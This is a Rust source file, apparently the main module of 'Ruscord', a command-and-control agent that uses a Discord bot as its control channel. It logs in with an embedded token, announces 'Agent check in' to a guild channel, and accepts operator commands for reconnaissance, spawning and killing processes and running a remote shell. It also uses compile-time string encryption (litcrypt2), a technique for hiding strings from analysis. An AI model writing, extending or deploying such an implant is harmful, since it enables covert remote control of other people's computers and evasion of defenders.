use commands::{process, recon, utils};
use config::AgentConfig;
use constants::{DISCORD_TOKEN, RUSCORD_GUILD_ID};
use poise::FrameworkError;
use tokio::sync::Mutex;
use tracing::{info, warn};
use tracing_subscriber::EnvFilter;
mod commands;
mod config;
mod os;
use poise::serenity_prelude::{self as serenity};
#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

pub mod constants {
	include!(concat!(env!("OUT_DIR"), "/constants.rs"));
}

#[derive(Debug)]
pub struct Data {
	pub config: Mutex<AgentConfig>,
	pub initialization_time: tokio::time::Instant,
	pub os_module: crate::os::OsModule,
}

pub type RuscordError = Box<dyn std::error::Error + Send + Sync>;
pub type RuscordContext<'a> = poise::Context<'a, Data, RuscordError>;
pub type RuscordResult<T> = std::result::Result<T, RuscordError>;

#[tokio::main]
async fn main() {
	// SAFETY: This is safe because there should be no additional threads
	// spawned at this point.

	#[cfg(target_os = "windows")]
	unsafe {
		std::env::set_var("RUST_LOG", "warn,discord_c2=debug");
	}
	#[cfg(target_family = "unix")]
	std::env::set_var("RUST_LOG", "warn,discord_c2=debug");

	tracing_subscriber::fmt()
		.with_env_filter(EnvFilter::from_default_env())
		.init();
	let intents = serenity::GatewayIntents::all();

	let framework = poise::Framework::builder()
		.options(poise::FrameworkOptions {
			prefix_options: poise::PrefixFrameworkOptions {
				prefix: Some("!".into()),
				..Default::default()
			},
			commands: vec![
				utils::clear(),
				utils::help(),
				recon::agent_info(),
				recon::processes(),
				process::spawn(),
				process::kill(),
				process::shell(),
				process::process_info(),
			],
			event_handler: |ctx, event, framework, data| Box::pin(event_handler(ctx, event, framework, data)),
			on_error: |error| {
				Box::pin(async move {
					match error {
						FrameworkError::Command { error, ctx, .. } => {
							reply!(ctx, "{error}");
						},
						other => {
							if let Err(why) = poise::builtins::on_error(other).await {
								tracing::error!("error sending discord message: {}", why);
							}
						},
					}
				})
			},
			command_check: Some(|ctx| {
				Box::pin(async move {
					let guard = ctx.data().config.lock().await;
					if ctx.channel_id() != guard.command_channel {
						return Ok(false);
					}
					Ok(true)
				})
			}),
			..Default::default()
		})
		.setup(|ctx, _ready, framework| {
			Box::pin(async move {
				let agent_config = AgentConfig::load_config(ctx).await?;
				poise::builtins::register_in_guild(ctx, &framework.options().commands, RUSCORD_GUILD_ID).await?;
				Ok(Data {
					config: Mutex::new(agent_config),
					initialization_time: tokio::time::Instant::now(),
					os_module: crate::os::OsModule::default(),
				})
			})
		})
		.build();

	let mut client = serenity::ClientBuilder::new(&*DISCORD_TOKEN, intents)
		.framework(framework)
		.await
		.unwrap();
	client.start().await.unwrap();
}

async fn event_handler(
	ctx: &serenity::Context, event: &serenity::FullEvent, _framework: poise::FrameworkContext<'_, Data, RuscordError>,
	data: &Data,
) -> Result<(), RuscordError> {
	match event {
		serenity::FullEvent::Ready { data_about_bot } => {
			info!("logged in as {}", data_about_bot.user.name);
			let channel_id = data.config.lock().await.command_channel;
			channel_id.say(&ctx.http, "@everyone Agent check in").await?;
		},
		serenity::FullEvent::Message { .. } => {},
		serenity::FullEvent::Ratelimit { data } => {
			warn!("ratelimited: {:?}", data);
		},
		_ => {},
	}
	Ok(())
}
